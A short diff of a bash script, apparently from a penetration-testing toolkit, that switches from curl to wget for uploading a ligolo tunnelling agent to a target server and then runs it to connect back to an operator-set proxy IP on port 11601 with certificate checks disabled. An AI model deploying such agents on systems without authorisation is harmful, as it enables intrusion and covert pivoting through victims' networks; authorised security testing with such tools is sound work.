@@ -1,7 +1,7 @@
 #!/bin/bash
 
 : '
-curl: download ligolo agent to server and connect to proxy
+wget: download ligolo agent to server and connect to proxy
 '
 
 # Generate GUI form items (label, type (optional: default text), name, default (optional))
@@ -15,7 +15,7 @@ PROXY_IP=${form_data["proxy_ip"]}
 LOCATION="${SCRIPTS_DIR}/portListening/ligolo/.files"
 FILE="agent"
 
-curl_upload_file "${LOCATION}" "${FILE}"
+wget_upload_file "${LOCATION}" "${FILE}"
 sleep 3
 
 execute_command "${FILE_LOCATION} -connect ${PROXY_IP}:11601 -ignore-cert"
